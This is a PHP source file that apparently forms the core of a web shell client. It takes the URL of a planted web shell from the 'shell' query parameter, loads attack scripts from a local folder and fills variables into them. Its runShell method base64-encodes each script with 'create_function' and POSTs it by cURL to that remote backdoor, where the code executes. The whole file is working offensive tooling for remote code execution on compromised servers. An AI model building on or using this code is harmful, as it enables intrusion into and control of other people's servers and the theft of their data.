<?php

class App {

    public $config;
    public $controllers = array();
    protected $controllerData;
    protected $controller;
    protected $shell;

    public function __construct($config = null) {
        $this->config = $config;
        $this->loadControllers();
    }

    public function run() {
        if (!isset($_GET['shell'])) {
            echo 'web shell 地址不存在, 链接中需有 shell=[shell脚本地址]';
            exit();
        }
        $default = $this->config['defaultController'] ? $this->config['defaultController'] : 'index';
        $c = isset($_GET['c']) ? $_GET['c'] : $default;
        $this->controller = $this->controllers[$c];
        if (isset($this->controllers[$c])) {
            $this->controllerData = $this->controller->run();
        }
        return $this;
    }

    public function show() {
        if (isset($_GET['json'])) {
            require(__DIR__ . '/html/json.php');
            return;
        }
        require(__DIR__ . '/html/index.php');
    }

    public function getPages() {
        $pages = array();
        foreach ($this->controllers as $c => $controllers) {
            if ($controllers->pages)
                $pages[$c] = $controllers->pages;
        }
        return $pages;
    }

    protected function loadControllers() {
        $dir = __DIR__ . '/controller/';
        $files = scandir($dir);
        foreach ($files as $file) {
            if ($file == '.' || $file == '..')
                continue;
            if (preg_match('/(\w+)\.php$/', $file, $match)) {
                require_once($dir . $file);
                $class = $match[1] . "Controller";
                $this->controllers[strtolower($match[1])] = new $class($this->config);
            }
        }
    }

}

class Controller {

    public $config;
    public $pages = array();
    protected $var;

    public function __construct($config = null) {
        $this->config = $config;
    }

    public function run() {
        $a = isset($_GET['a']) ? $_GET['a'] : '';
        $method = $a . 'Action';
        if (method_exists($this, $a . 'Action')) {
            ob_start();
            $this->$method();
            $data = ob_get_clean();
            return $data;
        }
    }

    public function render($view, $data = NULL) {
        require(__DIR__ . '/html/' . $view . '.php');
    }

    public function loadScript($script) {
        $file = __DIR__ . '/script/' . $script . '.php';
        if (file_exists($file)) {
            $script = file_get_contents($file);
            $script = str_replace('<?php', '', $script);
            $script = preg_replace_callback('/\$VAR\[\'([\w_]+?)\'\]/', array($this, 'replace'), $script);
            return trim($script);
        }
    }

    protected function qvar($string) {
        return '"' . $string . '"';
    }

    protected function replace($match) {
        if (isset($this->var[$match[1]])) {
            return $this->var[$match[1]];
        }
    }

    public function runShell($script, $ext = array()) {
        $url = $_GET['shell'];
        $data = array('f' => 'create_function', 'p' => $script);
        $data = array_map('base64_encode', $data);
        $data = array_merge($ext, $data);
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
        $data = curl_exec($ch);
        curl_close($ch);
        return $data;
    }

}
